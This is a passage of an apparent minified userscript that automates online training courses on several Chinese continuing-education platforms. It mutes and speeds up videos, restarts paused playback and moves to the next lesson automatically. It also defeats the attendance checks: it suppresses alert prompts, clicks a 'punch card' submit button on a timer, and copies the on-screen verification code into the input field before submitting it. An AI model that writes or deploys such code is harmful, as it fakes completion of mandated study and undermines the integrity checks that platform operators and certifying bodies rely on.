        updateSpeedElement(e) {
            localStorage.setItem("_localSpeed", e.toString()), ElementObj.$video.playbackRate = e
        }
    }

    class henandikuang extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.videoplaying = -1, this.timer = null, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                ElementObj.$parentNodes = document.querySelectorAll(".state-l"), ElementObj.$parentNodes.length ? (clearInterval(e), ElementObj.$parentNodes[0].querySelector(".btn span").click()) : (ElementObj.$parentNodes = document.querySelectorAll(".course-card-item"), ElementObj.$parentNodes.length && (clearInterval(e), this.getParentIndex()), ElementObj.$allTask = document.querySelectorAll(".pt5 li"), ElementObj.$allTask.length && (clearInterval(e), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none")
            }, 1e3)
        }

        async getParentIndex() {
            let e = -1;
            for (var t = 0; t < ElementObj.$parentNodes.length - 1; t++) {
                var l = ElementObj.$parentNodes[t].querySelector(".progress-bar").style.width;
                if (parseInt(l) < 98) {
                    e = t;
                    break
                }
            }
            -1 == e ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c，\u8bf7\u66f4\u6362\u5176\u5b83\u8bfe\u7a0b") : ElementObj.$parentNodes[t].querySelector("a").click()
        }

        async getCurrentIndex() {
            showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 1500), ElementObj.$allTask.forEach((e, t) => {
                e = e.querySelector(".badge").innerText;
                100 != parseInt(e) && -1 == this.currentIndex && (this.currentIndex = t)
            }), showTip("⚠️⚠\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3);
            var e = ElementObj.$allTask[this.currentIndex];
            await sleep(200), e.click(), setTimeout(() => {
                this._o1()
            }, 4500)
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelectorAll("video")[1], ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), await this.getVideoDom(), ElementObj.$video.volume = 0, ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", ElementObj.$video.addEventListener("ended", async () => {
                var e;
                this.currentIndex >= ElementObj.$allTask.length - 1 ? (e = document.querySelector("a.back"), await sleep(200), e.click()) : (this.currentIndex += 1, e = ElementObj.$allTask[this.currentIndex], await sleep(300), e.click(), setTimeout(() => {
                    this._o1()
                }, 4500))
            })
        }
    }

    class zhejiangtjj extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.videoplaying = -1, this.timer = null, this._init()
        }

        async _init() {
            let n = setInterval(async () => {
                try {
                    var e, t = document.querySelectorAll(".course_2"),
                        l = document.querySelectorAll("tbody tr.el-table__row");
                    (t.length || l.length) && (clearInterval(n), ElementObj.$parentNodes = t.length ? t : l, e = t.length ? 1 : 2, this.getParentIndex(e)), ElementObj.$allTask = document.querySelectorAll(".page-name"), ElementObj.$allTask.length && (clearInterval(n), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none"
                } catch (e) {
                }
            }, 1e3)
        }

        async getParentIndex(e) {
            showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 1500);
            let l = 1 == e ? 0 : -1;
            ElementObj.$parentNodes.forEach((e, t) => {
                t > l && (e = e.querySelector(".el-progress__text").innerText, 100 != parseInt(e)) && -1 == this.currentIndex && (this.currentIndex = t)
            }), -1 == this.currentIndex && 2 == e ? (GM_openInTab("https://edu.tjj.zj.gov.cn/#/personal?componentId=ClassList&type=classlist", {active: !0}), setTimeout(() => {
                window.close()
            }, 3500)) : (showTip("⚠️⚠\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), e = ElementObj.$parentNodes[this.currentIndex].querySelector("button"), await sleep(200), e.click(), setTimeout(() => {
                location.reload()
            }, 3e3))
        }

        async getCurrentIndex() {
            showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 3500), ElementObj.$allTask.forEach((e, t) => {
                e.classList.contains("complete") || -1 != this.currentIndex || (this.currentIndex = t)
            }), ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3);
            var e = ElementObj.$allTask[this.currentIndex];
            await sleep(200), e.click(), setTimeout(() => {
                this._o1()
            }, 4500)
        }

        getVideoDom() {
            return new Promise(t => {
                let l = setInterval(() => {
                    var e = document.querySelector("#playerFrame")?.contentDocument;
                    ElementObj.$video = e.querySelector("video"), ElementObj.$video && (clearInterval(l), t(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), await this.getVideoDom(), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0;
            var e = document.querySelector(".mejs__overlay-button");
            await sleep(200), e.click(), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.punchCard(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                var e;
                this.currentIndex >= ElementObj.$allTask.length - 1 ? (setTimeout(() => {
                    window.close()
                }, 3500), e = document.querySelector(".back-btn"), await sleep(200), e.click()) : (this.currentIndex += 1, e = ElementObj.$allTask[this.currentIndex], await sleep(300), e.click(), setTimeout(() => {
                    this._o1()
                }, 4500))
            })
        }

        punchCard() {
            setInterval(() => {
                var e = document.querySelector(".btn-submit");
                e && e.click()
            }, 5e3)
        }
    }

    class jiangxizhipeizaixian extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.timer = null, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".units_wrap_box___1ncip"), ElementObj.$allTask.length && (clearInterval(e), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none"
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 1500), ElementObj.$allTask.forEach((e, t) => {
                var l = e.querySelector(".progress_get_on___3TDga"), e = e.querySelector(".not_start___3dAwS");
                (l || e) && -1 == this.currentIndex && (this.currentIndex = t)
            }), -1 == this.currentIndex && (this.currentIndex = 0), showTip("⚠️⚠\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), ElementObj.$allTask[this.currentIndex].click(), showTip("⚠️⚠\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4500)
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), await this.getVideoDom(), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3500), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                var e;
                this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u89c6\u9891\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (this.currentIndex += 1, e = ElementObj.$allTask[this.currentIndex], await sleep(300), e.click(), setTimeout(() => {
                    this._o1()
                }, 4500))
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
            }, 1e4)
        }
    }

    class lanzhoudxgs extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.timer = null, this.listenVidoeStatusTimer = null, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$btn_dropdown = document.querySelector("#catalogA"), ElementObj.$btn_dropdown?.click(), ElementObj.$allTask = document.querySelectorAll("li.activity-node"), ElementObj.$allTask.length && (clearInterval(e), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none"
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            showTip("⚠️⚠️⚠️\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 1500), await sleep(1500), "none" != $el("#toolsContentDiv").style.display && ElementObj.$btn_dropdown?.click();
            let l = [];
            ElementObj.$allTask.forEach((e, t) => {
                e.querySelector(".cedu-file-video") && l.push(e)
            }), ElementObj.$allTask = l, this.currentIndex = 0, setTimeout(() => {
                this._o1()
            }, 4500)
        }

        getVideoDom() {
            return new Promise(t => {
                let l = setInterval(() => {
                    var e = document.querySelector(".vjs-big-play-button");
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && e && (clearInterval(l), t(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), await this.getVideoDom(), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0;
            var e = document.querySelector(".vjs-big-play-button");
            await sleep(200), e?.click(), await sleep(2500), ElementObj.$video.pause(), setTimeout(() => {
                ElementObj.$video.currentTime -= 30, ElementObj.$video.play()
            }, 2500), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3500), this.changeHtml($el("#video_div")), this.listenPlayTime(), this.listenPageHide(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })
        }

        listenPlayTime() {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let t = 0;
            this.timer = setInterval(() => {
                t += 1;
                var e = (ElementObj.$video.currentTime / 60).toFixed(2);
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${t}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f`), ElementObj.$video.currentTime >= ElementObj.$video.duration - 4 && this.playNext()
            }, 5e3)
        }

        listenVidoeStatus(t, l) {
            if (t) {
                let e = 0;
                this.timer2 = setInterval(() => {
                    t.readyState < 4 && (this.addInfo(`\u68c0\u6d4b\u5230${e}\u6b21，\u89c6\u9891\u6b63\u5728\u52a0\u8f7d`, 0), 20 <= (e += 1)) && location.reload(), t.paused && (e += 1, "function" == typeof l) && (20 <= e ? location.reload() : l())
                }, 3e3)
            }
        }

        async playNext() {
            showTip("⚠️⚠️⚠️\u68c0\u6d4b\u5230\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a\u89c6\u9891", 4500), await sleep(5e3), this.currentIndex += 1;
            var e = ElementObj.$allTask[this.currentIndex], t = (await sleep(300), e.querySelector(".cedu-file-video"));
            t ? e.click() : alert("\u5f53\u524d\u8bfe\u7a0b\u89c6\u9891\u5df2\u5168\u90e8\u64ad\u653e\u5b8c")
        }
    }

    class jidianshejijiaoyu extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.swiperIndex = -1, this.timer = null, this.listenVidoeStatusTimer = null, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    document.querySelector(".layui-layer-btn0") ? (clearInterval(e), this.playNext()) : (ElementObj.$allTask = document.querySelectorAll(".course_chapter_item"), ElementObj.$allTask.length && (clearInterval(e), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none")
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            showTip("⚠️⚠️⚠️\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 1500), await sleep(1500), ElementObj.$allTask.forEach((e, t) => {
                e.querySelector("i.fa-circle") || -1 != this.currentIndex || (this.currentIndex = t)
            }), -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (ElementObj.$allTask[this.currentIndex].querySelector(".section_title").click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 3500), setTimeout(() => {
                this.getSwiperIndex()
            }, 4500))
        }

        getSwiperIndex() {
            ElementObj.$swiperItem = document.querySelectorAll("#menu_tarr_content .courseware_menu_item"), this.swiperIndex = -1;
            for (var e = 0; e <= ElementObj.$swiperItem.length - 1; e++) {
                var t = ElementObj.$swiperItem[e];
                if (t.querySelector(".icon-note-video-learning")) {
                    this.swiperIndex = e, t.click(), setTimeout(() => {
                        this._o1()
                    }, 3500);
                    break
                }
            }
            -1 == this.swiperIndex && location.reload()
        }

        getVideoDom() {
            return new Promise(t => {
                let l = setInterval(() => {
                    var e = document.querySelector(".vjs-big-play-button");
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && e && (clearInterval(l), t(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), await this.getVideoDom(), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0, await sleep(2500), ElementObj.$video.play(), this.changeHtml($el(".video-play")), this.listenPlayTime(), this.listenPageHide(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })
        }

        listenPlayTime() {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let t = 0;
            this.timer = setInterval(() => {
                t += 1;
                var e = (ElementObj.$video.currentTime / 60).toFixed(2),
                    e = (this.addInfo(`\u540e\u53f0\u5b66\u4e60${t}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f`), document.querySelector(".complete"));
                e && (this.addInfo("✅✅✅，\u5f53\u524d\u89c6\u9891\u64ad\u653e\u5b8c\u6210，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a\u89c6\u9891"), this.swiperIndex >= ElementObj.$swiperItem.length - 1 ? location.reload() : (this.swiperIndex += 1, $el("#right_tarr").click(), setTimeout(() => {
                    this._o1()
                }, 3500))), ElementObj.$video.currentTime >= ElementObj.$video.duration - 4 && this.playNext()
            }, 5e3)
        }

        listenVidoeStatus(t, l) {
            if (t) {
                let e = 0;
                this.timer2 = setInterval(() => {
                    t.readyState < 4 && (this.addInfo(`\u68c0\u6d4b\u5230${e}\u6b21，\u89c6\u9891\u6b63\u5728\u52a0\u8f7d`, 0), 20 <= (e += 1)) && location.reload(), t.paused && (e += 1, "function" == typeof l) && (20 <= e ? location.reload() : l())
                }, 3e3)
            }
        }

        async playNext() {
            showTip("⚠️⚠️⚠️\u68c0\u6d4b\u5230\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a\u89c6\u9891", 4500), await sleep(5e3);
            var e = document.querySelector(".layui-layer-btn0");
            e && (e.click(), await sleep(2e3), location.reload())
        }
    }

    class ycjyluteducn extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this.parentIndex = -1, this._init()
        }

        async _init() {
            window.alert = function () {
            };
            let t = setInterval(async () => {
                var e;
                ["/learnspace/learn/homework/blue/student/homework_complete.action", "/learnspace/course/test/coursewareTest_intoTestPage.action", "/learnspace/learn/learn/blue/content_video.action"].includes(location.pathname) ? (clearInterval(t), window.close()) : (e = document.querySelector("#courseware_main_menu").querySelector("a")) && (clearInterval(t), e.click(), await this.findParentIndex())
            }, 500)
        }

        async findParentIndex() {
            showTip("🔉\u6b63\u5728\u521d\u59cb\u5316", 2500), await sleep(4500), unsafeWindow.alert = () => {
            }, ElementObj.$handleSpeedUp.style.display = "none";
            var e = document.querySelector(".contentIframe"), t = e.contentWindow.document;
            e.contentWindow.alert = () => {
            }, ElementObj.$parentNodes = t.querySelectorAll(".vcon li");
            for (let e = 0; e < ElementObj.$parentNodes.length; e++) {
                var l = ElementObj.$parentNodes[e], n = l.querySelector("span"),
                    a = l.innerText.indexOf("\u7ec3\u4e60"), l = l.innerText.indexOf("\u8bfe\u7a0b\u4f5c\u4e1a");
                if ((n.classList.contains("undo") || n.classList.contains("doing")) && -1 == this.parentIndex && -1 == a && -1 == l) {
                    this.parentIndex = e, ElementObj.$parentNodes[e].querySelector("a").click();
                    break
                }
            }
            -1 == this.parentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u53d1\u5b8c") : await this.getCurrentIndex()
        }

        async getCurrentIndex() {
            showTip("\u6b63\u5728\u521d\u59cb\u5316", 2500);
            let t = setInterval(() => {
                var e = document.querySelector(".contentIframe");
                ElementObj._document = e.contentWindow.document, ElementObj.$allTask = ElementObj._document.querySelectorAll(".menub"), ElementObj.$allTask.length && (clearInterval(t), this.currentIndex = 0, ElementObj.$allTask[this.currentIndex]?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), this._o1())
            }, 1e3)
        }

        getVideoDom() {
            return new Promise(t => {
                let l = setInterval(() => {
                    var e = ElementObj._document.querySelector("#mainFrame").contentDocument;
                    ElementObj.$video = e.querySelector("video"), ElementObj.$video ? (clearInterval(l), t(1)) : (e.querySelector("#content_frame"), clearInterval(l), t(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), clearInterval(this.timer2), unsafeWindow.alert = () => {
            };
            var e = await this.getVideoDom();
            this.listenRebort(), 1 == e && (ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                    ElementObj.$video.playbackRate = toolOption.accelerator
                }, 3e3)
            }), ElementObj.$video.addEventListener("ended", async () => {
                await sleep(3e3), this.playNext()
            })), 2 == e && (this.timer2 = setTimeout(() => {
                this.playNext()
            }, 7e3))
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                unsafeWindow.alert = function () {
                };
                var e = document.querySelector(".layui-layer-btn a");
                e && (e.click(), ElementObj.$video.play(), setTimeout(() => {
                    ElementObj.$video.playbackRate = toolOption.accelerator
                }, 3e3))
            }, 1e4)
        }

        async playNext() {
            unsafeWindow.alert = () => {
            }, showTip("✅✅✅\u64ad\u653e\u5b8c\u6210，\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 3500), this.currentIndex >= ElementObj.$allTask.length - 1 ? (this.parentIndex += 1, -1 != ElementObj.$parentNodes[this.parentIndex].innerText.indexOf("\u7ec3\u4e60") && (this.parentIndex += 1), ElementObj.$parentNodes[this.parentIndex].querySelector("a").click(), setTimeout(() => {
                this.getCurrentIndex()
            }, 4500)) : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), await sleep(5e3), this._o1())
        }
    }

    ycjyluteducn.ctxid = 26;

    class gdrcjxjyw extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.timer = null, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                try {
                    var e;
                    ElementObj.$parentNodes = document.querySelectorAll(".m-list .item"), ElementObj.$parentNodes.length ? (clearInterval(t), this.getParentIndex()) : (ElementObj.$video = document.querySelector("video"), ElementObj.$video && "www.rcjxjy.com" == location.host ? (clearInterval(t), this._o1()) : (e = document.querySelectorAll(".player-table")[2], ElementObj.$allTask = e.querySelectorAll("td"), ElementObj.$allTask.length && (clearInterval(t), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none"))
                } catch (e) {
                }
            }, 1e3)
        }

        async getParentIndex() {
            showTip("✅✅✅\u6b63\u5728\u521d\u59cb\u5316，\u8bf7\u52ff\u70b9\u51fb", 3e3);
            let t = 0, l = setInterval(async () => {
                ElementObj.$parentNodes[t].querySelector(".btn-continue-study").click(), await sleep(500), ElementObj.$allTask = document.querySelectorAll(".video-item .f-cb");
                for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if ("\u64ad\u653e\u5b8c\u6210" != ElementObj.$allTask[e].querySelector(".videoName").innerText) {
                    clearInterval(l), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210"), ElementObj.$allTask[e].querySelector("a.u-btn").click();
                    break
                }
                t += 1
            }, 3e3)
        }

        async getCurrentIndex() {
            let n = -1;
            ElementObj.$allTask.forEach((e, t) => {
                var l = e.querySelector(".playLine").innerText;
                100 != parseInt(l) && -1 == this.currentIndex && (this.currentIndex = t), e.classList.contains("couBg") && (n = t)
            }), -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u89c6\u9891\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (this.currentIndex != n && ElementObj.$allTask[this.currentIndex].querySelector("a").click(), showTip("⚠️⚠️⚠️\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3500), setTimeout(() => {
                this._o1()
            }, 4500))
        }

        getVideoDom() {
            return ElementObj.$handleSpeedUp.style.display = "none", new Promise(t => {
                let l = setInterval(() => {
                    var e;
                    ElementObj.$video = document.querySelector("video"), (ElementObj.$video || (e = document.querySelector("#c_frame").contentDocument, ElementObj.$video = e.querySelector("video"), ElementObj.$video)) && (clearInterval(l), t(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), await this.getVideoDom(), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3500), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("⚠️⚠️⚠️\u68c0\u6d4b\u5230\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a\u89c6\u9891", 4500), await sleep(3e3), "www.rcjxjy.com" == location.host ? document.querySelector("a.u-btn.normal").click() : location.reload()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator
                }, 1500)
            })
        }
    }

    class shixuetong extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.timer = null, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$allTask = document.querySelectorAll(".Nvideo-item li"), ElementObj.$allTask.length && (clearInterval(e), $el(".Nvideo-playbox").style.position = "relative", this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            this.currentIndex = 0, showTip("⚠️⚠️⚠️\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3500), setTimeout(() => {
                this._o1()
            }, 4500)
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video && ElementObj.$video.src && (clearInterval(l), e(1)), 10 < t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.timer), clearInterval(this.timer2);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3500), this.changeHtml($el(".video")), this.listenPageHide(), this.listenPlayTime(), this.listenRebort(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("⚠️⚠️⚠️\u68c0\u6d4b\u5230\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a\u89c6\u9891", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator
                }, 1500)
            })), 2 == e && (showTip("⚠️⚠️⚠️\u68c0\u6d4b\u5230\u5f53\u524d\u4e0d\u662f\u89c6\u9891，5\u79d2\u540e\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a\u89c6\u9891", 4500), this.playNext())
        }

        async playNext() {
            var e, t;
            await sleep(2e3), this.currentIndex >= ElementObj.$allTask.length - 1 ? (e = document.querySelector("#courseStudyBestMinutesNumber").innerText, t = document.querySelector("#courseStudyMinutesNumber").innerText, parseFloat(e) > parseFloat(t) && location.reload()) : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                document.querySelector(".layui-layer-btn- a")?.click(), this._o1()
            }, 4500))
        }

        listenPlayTime() {
            showTip("⚠️⚠️⚠️\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let l = 0;
            this.timer = setInterval(async () => {
                l += 1;
                var e, t = (ElementObj.$video.currentTime / 60).toFixed(2);
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${t}\u5206\u949f`), l % 30 == 0 && (t = $el("#courseStudyBestMinutesNumber").innerText, document.querySelector(".studyCourseTimeRefresh")?.click(), await sleep(2e3), e = $el("#courseStudyMinutesNumber").innerText, this.addInfo(`✅✅✅\u672c\u8bfe\u7a0b\u6700\u957f\u53ef\u7d2f\u8ba1\u65f6\u95f4：${t}\u5206\u949f，\u60a8\u5df2\u6210\u529f\u5b66\u4e60${e}\u5206\u949f`, 0))
            }, 5e3)
        }

        listenRebort() {
            this.timer2 = setInterval(() => {
                var e, t = document.querySelector("#codespan");
                t && (clearInterval(this.timer2), e = document.querySelector("#code"), t = t.innerText, e.value = t, document.querySelector(".layui-layer-btn0").click(), this.listenRebort())
            }, 8e3)
        }
    }

    class shandongzhuanyejisu extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    document.querySelectorAll(".learn-menu-cell").length && (clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            showTip("\u6b63\u5728\u521d\u59cb\u5316");
            for (var e = document.querySelector(".contentIframe"), t = (ElementObj._document = e.contentWindow.document, "/learnspace/learn/learn/templateeight/index.action" == location.pathname ? ElementObj.$allTask = ElementObj._document.querySelectorAll(".s_sectionwrap .s_pointwrap .s_point") : ElementObj.$allTask = ElementObj._document.querySelectorAll(".s_pointwrap .s_point"), ElementObj.$handleSpeedUp.style.display = "none", 0); t <= ElementObj.$allTask.length - 1; t++) if (!ElementObj.$allTask[t].querySelector(".item_done_icon").classList.contains("done_icon_show")) {
                this.currentIndex = t;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c") : (ElementObj.$allTask[this.currentIndex]?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), this._o1())
        }

        getVideoDom() {
            return new Promise(t => {
                let l = 0, n = setInterval(() => {
                    var e = ElementObj._document.querySelector("#mainFrame").contentWindow.document;
                    ElementObj.$video = e.querySelector("video"), ElementObj.$video && (clearInterval(n), t(1)), 10 <= l && (clearInterval(n), t(2)), l++
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
